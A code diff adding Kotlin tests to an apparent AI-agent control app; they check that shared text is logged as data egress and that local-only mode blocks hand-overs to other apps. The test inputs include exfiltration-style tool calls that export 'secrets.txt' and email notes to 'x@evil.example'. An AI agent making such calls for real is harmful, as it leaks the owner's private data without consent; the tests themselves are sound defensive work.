@@ -23,6 +23,7 @@ import com.aicontrolcenter.core.tools.CapabilityConstraint
 import com.aicontrolcenter.core.tools.ToolContext
 import com.aicontrolcenter.framework.operator.OperatorTaskHooks
 import com.aicontrolcenter.framework.tools.ToolCallEnd
+import kotlinx.coroutines.async
 import kotlinx.coroutines.flow.first
 import kotlinx.coroutines.flow.flowOf
 import kotlinx.coroutines.test.TestScope
@@ -202,5 +203,70 @@ class AppGraphOperatorTest {
         assertEquals(ToolCallEnd.DENIED, shell.end)
         assertTrue("Local-only mode" in shell.outcome.content, shell.outcome.content)
         assertTrue(app.ownerRequestStore.observeRecent(10).first().isEmpty(), "nobody was asked")
+    }
+
+    @Test
+    fun `B1 - a text an agent shares is logged as handed to another app, and local-only mode refuses every hand-over`() = runTest(mainRule.dispatcher) {
+        val app = started()
+        app.graph.start().join()
+        val operator = app.agentNamed("Operator").profile.id
+        assertIs<OwnerResult.Done<*>>(app.graph.ownerGrants.grant(operator, OperatorCapabilities.APPS_COMPOSE))
+
+        val shared = app.call("apps_share_text", buildJsonObject { put("text", "the owner's notes: PIN 4711") })
+        runCurrent()
+        assertEquals(ToolCallEnd.OK, shared.end, shared.outcome.content)
+        val sent = app.activityLog.recent().filter { it.type == ActivityType.DATA_EGRESS }.single { it.title == "Text handed to another app" }
+        assertEquals("the app you choose in Android's share sheet", sent.egress?.destinationHost)
+        assertEquals(operator, sent.agentId)
+        assertTrue("27 characters of text" in sent.detail && "4711" !in sent.detail, sent.detail)
+
+        // Local-only mode: nothing is handed to another app, whatever was granted, and the owner is not asked.
+        app.settings.update { it.copy(localOnlyMode = true) }
+        val calls = listOf(
+            app.call("apps_share_text", buildJsonObject { put("text", "the owner's notes: PIN 4711"); put("app", "org.mozilla.firefox") }),
+            app.call("workspace_export", buildJsonObject { put("path", "secrets.txt") }),
+            app.call("apps_compose_email", buildJsonObject { put("to", kotlinx.serialization.json.buildJsonArray { add(kotlinx.serialization.json.JsonPrimitive("x@evil.example")) }); put("body", "notes") }),
+            app.call("apps_compose_sms", buildJsonObject { put("number", "+44 20 7946 0958"); put("body", "notes") }),
+            app.call("apps_dial", buildJsonObject { put("number", "+44 20 7946 0958") }),
+        )
+        for (call in calls) {
+            assertEquals(ToolCallEnd.DENIED, call.end, "${call.call.name}: ${call.outcome.content}")
+            assertTrue("Local-only mode is on" in call.outcome.content, call.outcome.content)
+        }
+        assertTrue(app.ownerRequestStore.observeRecent(10).first().isEmpty(), "nobody was asked")
+        assertEquals(1, app.activityLog.recent().count { it.type == ActivityType.DATA_EGRESS }, "nothing more left this app")
+    }
+
+    @Test
+    fun `B2 - after a Deny the owner lets the agent ask again, and its next call is put to the owner at once`() = runTest(mainRule.dispatcher) {
+        // The verifier's N1: Deny on a permission without a target, then the owner changes their mind and the work is run again.
+        val app = TestApp(backgroundScope, FrameworkSettings(operatorEnabled = true, approvalTimeoutMinutes = 100_000))
+        app.graph.start().join()
+        val operator = app.agentNamed("Operator").profile
+        app.web.page("https://example.org/news", "<html><body><p>Hello</p></body></html>")
+        val refusal = app.raise(samplePermission(operator.id, agentName = "Operator", id = "req_refused", createdAt = app.clock.current, minutes = 100_000))
+        app.graph.ownerRequests.deny(refusal.id)
+        val call = ToolCallRequest("c1", "web_read_page", buildJsonObject { put("url", "https://example.org/news") })
+
+        val refused = app.graph.toolExecutor.execute(call, ToolContext(operator, TaskId("tsk_b"), TaskId("tsk_root")))
+        assertEquals(ToolCallEnd.DENIED, refused.end)
+        assertTrue("not asked again" in refused.outcome.content, refused.outcome.content)
+        assertTrue("Tools, History, on the refused request, with \"Let it ask again\"" in refused.outcome.content, refused.outcome.content)
+        assertTrue(app.graph.ownerRequests.pending.first().isEmpty())
+
+        val opened = assertIs<OwnerResult.Done<com.aicontrolcenter.core.operator.OwnerRequest>>(app.graph.ownerRequests.letAskAgain(refusal.id)).value
+        assertNotNull(opened.askAgainAt)
+        assertTrue(app.permissions.observeAll().first().isEmpty(), "nothing was given")
+
+        val again = async { app.graph.toolExecutor.execute(call.copy(id = "c2"), ToolContext(operator, TaskId("tsk_c"), TaskId("tsk_root"))) }
+        runCurrent()
+        val asked = app.graph.ownerRequests.pending.first().single()
+        assertEquals(OwnerRequestKind.PERMISSION, asked.kind)
+        assertEquals(OperatorCapabilities.WEB_READ, asked.capability)
+        // Without the owner's action the refusal would still hold at this moment: it was the action that let the call ask.
+        assertTrue(opened.copy(askAgainAt = null).holdsBackAt(asked.createdAt), "the ten minutes were not over when the new request was raised")
+        app.graph.ownerRequests.grant(asked.id, com.aicontrolcenter.core.operator.GrantScope.ONCE)
+        runCurrent()
+        assertEquals(ToolCallEnd.OK, again.await().end, again.await().outcome.content)
     }
 }
